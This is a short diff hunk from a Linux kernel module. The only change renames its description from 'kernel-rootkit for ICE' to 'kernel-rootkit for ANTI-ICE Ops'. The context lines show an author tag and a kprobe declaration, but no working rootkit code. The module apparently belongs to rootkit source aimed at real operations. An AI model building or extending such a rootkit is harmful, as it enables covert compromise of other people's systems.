@@ -7,7 +7,7 @@
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("nullcollective");
-MODULE_DESCRIPTION("kernel-rootkit for ICE");
+MODULE_DESCRIPTION("kernel-rootkit for ANTI-ICE Ops");
 
 static struct kprobe kp;
 
